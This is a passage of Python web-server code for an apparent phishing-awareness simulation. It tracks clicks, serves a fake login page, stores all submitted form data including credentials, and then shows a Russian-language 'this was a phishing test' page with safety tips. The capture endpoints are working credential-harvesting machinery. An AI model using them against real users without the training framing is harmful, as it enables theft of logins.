# Tracking Endpoints
# ---------------------------------------------------------------------------

@app.get("/track/click/{token}")
async def track_click(token: str):
    uid = uuid.UUID(token)
    async with AsyncSessionLocal() as session:
        result = await session.execute(
            select(CampaignTarget).where(CampaignTarget.tracking_token == uid)
        )
        ct = result.scalar_one_or_none()
        if not ct:
            raise HTTPException(status_code=404, detail="Token not found")

        if ct.status == "sent":
            ct.status = "clicked"
            await session.commit()

    return RedirectResponse(url=f"/landing/{token}", status_code=302)


@app.get("/landing/{token}", response_class=HTMLResponse)
async def landing_page(token: str):
    uid = uuid.UUID(token)
    async with AsyncSessionLocal() as session:
        result = await session.execute(
            select(CampaignTarget, Campaign)
            .join(Campaign, CampaignTarget.campaign_id == Campaign.id)
            .where(CampaignTarget.tracking_token == uid)
        )
        row = result.one_or_none()
        if not row:
            raise HTTPException(status_code=404, detail="Token not found")

        ct, campaign = row
        slug = campaign.landing_slug or "vk"
        html = LANDING_TEMPLATES.get(slug, LANDING_TEMPLATES["vk"])

        submit_url = f"{settings.base_url}/track/submit/{token}"
        html = html.replace(
            'method="POST"',
            f'method="POST" action="{submit_url}"',
        )
        return HTMLResponse(content=html)


@app.post("/track/submit/{token}")
async def track_submit(token: str, request: Request):
    uid = uuid.UUID(token)
    form_data = await request.form()
    data_dict = dict(form_data)

    async with AsyncSessionLocal() as session:
        result = await session.execute(
            select(CampaignTarget).where(CampaignTarget.tracking_token == uid)
        )
        ct = result.scalar_one_or_none()
        if not ct:
            raise HTTPException(status_code=404, detail="Token not found")

        ct.status = "submitted"
        ct.submitted_data = data_dict
        await session.commit()

    return RedirectResponse(url=f"/warning/{token}", status_code=302)


@app.get("/warning/{token}", response_class=HTMLResponse)
async def warning_page(token: str):
    uid = uuid.UUID(token)
    async with AsyncSessionLocal() as session:
        result = await session.execute(
            select(CampaignTarget, Campaign)
            .join(Campaign, CampaignTarget.campaign_id == Campaign.id)
            .where(CampaignTarget.tracking_token == uid)
        )
        row = result.one_or_none()
        if not row:
            raise HTTPException(status_code=404, detail="Token not found")

        ct, campaign = row
        slug = campaign.landing_slug or "vk"
        real_url = LANDING_REDIRECTS.get(slug, "https://google.com")

    html = f"""
<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Внимание — Фишинг-тест</title>
<style>
  body{{margin:0;font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:#fff3cd;display:flex;justify-content:center;align-items:center;min-height:100vh}}
  .card{{background:#fff;border-radius:16px;padding:48px;max-width:520px;box-shadow:0 4px 24px rgba(0,0,0,.1);text-align:center}}
  .icon{{font-size:64px;margin-bottom:16px}}
  h1{{color:#d63031;font-size:24px;margin:0 0 16px}}
  p{{color:#333;line-height:1.6;margin-bottom:12px}}
  ul{{text-align:left;color:#555;line-height:1.8;margin:16px 0}}
  a.btn{{display:inline-block;margin-top:20px;padding:12px 32px;background:#0984e3;color:#fff;text-decoration:none;border-radius:8px;font-size:15px}}
  a.btn:hover{{background:#0767b5}}
</style>
</head>
<body>
<div class="card">
  <div class="icon">&#9888;</div>
  <h1>Это был тест на фишинг!</h1>
  <p>Вы только что ввели свои учётные данные на поддельной странице входа.
     Не волнуйтесь — это была <strong>учебная симуляция фишинговой атаки</strong>,
     проводимая в рамках курса по информационной безопасности.</p>
  <p>Ваши данные были перехвачены <strong>только в образовательных целях</strong>
     и будут удалены после анализа результатов.</p>
  <p><strong>Как распознать фишинг:</strong></p>
  <ul>
    <li>Всегда проверяйте адресную строку браузера</li>
    <li>Не переходите по ссылкам из подозрительных писем</li>
    <li>Обращайте внимание на орфографию и оформление</li>
    <li>Используйте двухфакторную аутентификацию</li>
    <li>Не вводите пароли на незнакомых сайтах</li>
    <li>При сомнениях — зайдите на сайт напрямую, а не по ссылке</li>
  </ul>
  <a class="btn" href="{real_url}">Перейти на настоящий сайт</a>
</div>
</body>
</html>
"""
    return HTMLResponse(content=html)
